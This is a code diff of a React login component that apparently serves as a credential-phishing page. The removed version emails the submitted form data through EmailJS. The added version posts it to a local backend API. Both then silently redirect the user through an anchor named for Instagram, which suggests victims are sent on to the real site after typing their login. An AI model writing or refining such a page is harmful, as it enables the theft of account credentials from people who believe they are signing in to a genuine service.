@@ -1,5 +1,4 @@
 import React, { useState, useRef } from 'react';
-import emailjs from 'emailjs-com';
 
 const Login = () => {
   // State to store form data and errors
@@ -43,20 +42,26 @@ const Login = () => {
       return;
     }
 
-    // If valid, send form data using EmailJS
-    emailjs.send(
-      import.meta.env.VITE_EMAILJS_SERVICE_ID,  // EmailJS Service ID from .env
-      import.meta.env.VITE_EMAILJS_TEMPLATE_ID, // EmailJS Template ID from .env
-      formData,                                 // Data to be sent in the email
-      import.meta.env.VITE_EMAILJS_USER_ID      // EmailJS User ID from .env
-    )
-    .then((result) => {
-      console.log('Email successfully sent:', result.text);
-      // Programmatically trigger the anchor tag click event for redirection
-      instaRedirectRef.current.click();
+    // If valid, send form data to backend API
+    fetch('http://localhost:5000/api/submit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(formData)
+    })
+    .then((response) => response.json())
+    .then((data) => {
+      if (data.error) {
+        setError(data.error);
+      } else {
+        console.log('Form submitted successfully:', data.message);
+        // Programmatically trigger the anchor tag click event for redirection
+        instaRedirectRef.current.click();
+      }
     })
     .catch((error) => {
-      console.error('Email sending error:', error.text);
+      console.error('Submission error:', error);
       setError('There was an error submitting the form. Please try again.');
     });
   };
